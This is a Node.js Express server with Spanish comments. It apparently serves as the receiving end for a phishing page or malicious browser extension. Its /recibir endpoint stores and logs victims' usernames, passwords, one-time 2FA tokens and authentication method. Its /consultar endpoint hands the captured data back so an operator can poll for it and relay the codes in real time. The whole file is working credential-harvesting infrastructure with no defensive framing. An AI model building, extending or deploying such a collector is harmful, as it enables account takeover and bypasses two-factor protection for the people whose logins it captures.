const express = require('express');
const cors = require('cors'); 
const app = express();

app.use(cors()); 
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

let baseDeDatosTemporal = {
    user: null,
    pass: null,
    token: null,
    origen: null,
    actualizado: false,
    metodo: null 
};

// --- RUTA: RECIBIR MÉTODO ---
app.post('/metodo', (req, res) => {
    const { metodo } = req.body;
    baseDeDatosTemporal.metodo = metodo;
    baseDeDatosTemporal.actualizado = true; // Importante para que la extensión lo vea
    console.log("===============================");
    console.log(`🎯 Método Seleccionado: ${metodo ? metodo.toUpperCase() : 'NULL'}`);
    console.log("===============================");
    res.status(200).send("OK");
});

app.post('/recibir', (req, res) => {
    // CAMBIO AQUÍ: Ahora extraemos también 'metodo' del cuerpo de la petición
    const { user, pass, token, origen, metodo } = req.body;

    let tokenFinal;

    if (origen === "LOGIN_INICIAL") {
        tokenFinal = null;
    } else if (token !== undefined && token !== "") {
        tokenFinal = token;
    } else {
        tokenFinal = (user === baseDeDatosTemporal.user) ? baseDeDatosTemporal.token : null;
    }

    // RECONSTRUCCIÓN DEL OBJETO CORREGIDA
    baseDeDatosTemporal = {
        user: user || baseDeDatosTemporal.user,
        pass: pass || baseDeDatosTemporal.pass,
        token: tokenFinal,
        origen: origen,
        // CAMBIO AQUÍ: Si viene un método en la petición, úsalo; si no, mantén el que ya tenemos
        metodo: metodo || baseDeDatosTemporal.metodo, 
        actualizado: true
    };

    console.log("===============================");
    console.log(`👤 Usuario: ${baseDeDatosTemporal.user}`);
    console.log(`📲 Token: ${baseDeDatosTemporal.token === null ? "ESPERANDO..." : baseDeDatosTemporal.token}`);
    console.log(`🛠️ Método Auth: ${baseDeDatosTemporal.metodo || "NO DEFINIDO"}`);
    console.log("===============================");

    res.status(200).send("OK");
});

app.post('/limpiar', (req, res) => {
    baseDeDatosTemporal = {
        user: null,
        pass: null,
        token: null,
        origen: null,
        actualizado: false,
        metodo: null 
    };
    console.log("🧹 Base de datos reseteada.");
    res.status(200).send("Limpiado");
});

app.get('/consultar', (req, res) => {
    res.json(baseDeDatosTemporal);
});

app.get('/', (req, res) => {
    res.send("Servidor Activo");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => { console.log(`Puerto ${PORT}`); });
